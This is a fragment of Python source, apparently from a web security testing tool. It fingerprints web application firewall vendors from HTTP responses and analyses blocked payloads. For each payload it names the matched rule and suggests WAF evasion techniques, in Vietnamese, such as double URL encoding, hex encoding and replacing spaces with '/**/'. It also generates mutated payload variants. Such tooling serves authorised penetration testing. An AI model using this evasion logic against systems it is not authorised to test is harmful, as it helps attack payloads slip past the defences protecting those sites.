    def fingerprint(
        self,
        status_code: int,
        headers: dict[str, Any],
        body: str = "",
    ) -> Optional[str]:
        """Detect WAF vendor based on HTTP response status, headers, and body."""
        headers_lower = {k.lower(): str(v).lower() for k, v in headers.items()}
        body_lower = (body or "").lower()

        for vendor, sig in self.WAF_SIGNATURES.items():
            # Check headers
            for h in sig["headers"]:
                if any(h in hk or h in hv for hk, hv in headers_lower.items()):
                    return vendor

            # Check status code and body
            if status_code in sig["status_codes"]:
                for b_marker in sig["body"]:
                    if b_marker in body_lower:
                        return vendor

        # Fallback heuristic for generic blocks
        if status_code in (403, 406, 429) and any(kw in body_lower for kw in ("waf", "blocked", "forbidden", "firewall", "incident")):
            return "Generic Web Application Firewall"

        return None

    def decompile_blocked_payload(
        self,
        payload: str,
        detected_waf: str = "",
    ) -> BlockedTokenAnalysis:
        """Analyze a payload to determine which syntactic tokens triggered WAF rules."""
        matched_rules: list[dict[str, Any]] = []

        for rule in self.TOKEN_RULES:
            if rule["regex"].search(payload):
                matched_rules.append(rule)

        if not matched_rules:
            # Fallback for arbitrary strings
            return BlockedTokenAnalysis(
                detected_waf=detected_waf or "Generic WAF/Filter",
                original_payload=payload,
                blocked_tokens=["Unidentified suspicious pattern"],
                probable_rule_id="OWASP CRS 949110: Inbound Anomaly Score Exceeded",
                recommended_evasions=[
                    "Áp dụng mã hóa URL kép (%25XX)",
                    "Thay thế ký tự đặc biệt bằng biểu diễn thập lục phân (Hex Encoding)",
                    "Giảm kích thước payload và chèn khoảng trắng giả lập (Tabs/Newlines)",
                ],
                mutated_alternatives=[
                    payload.replace(" ", "%20"),
                    payload.replace(" ", "/**/"),
                ],
            )

        # Aggregate matched tokens, rules, evasions, and mutations
        all_tokens: list[str] = []
        all_rules: list[str] = []
        all_evasions: list[str] = []
        mutated_variants: list[str] = []

        for r in matched_rules:
            all_tokens.extend(r["blocked_tokens"])
            all_rules.append(r["rule_id"])
            all_evasions.extend(r["evasions"])
            mutated = r["mutator"](payload)
            if mutated != payload and mutated not in mutated_variants:
                mutated_variants.append(mutated)

        # Deduplicate while preserving order
        unique_tokens = list(dict.fromkeys(all_tokens))
        unique_evasions = list(dict.fromkeys(all_evasions))

        return BlockedTokenAnalysis(
            detected_waf=detected_waf or "Generic WAF",
            original_payload=payload,
            blocked_tokens=unique_tokens,
            probable_rule_id=all_rules[0] if all_rules else "OWASP CRS 942100",
            recommended_evasions=unique_evasions,
            mutated_alternatives=mutated_variants or [payload],
        )
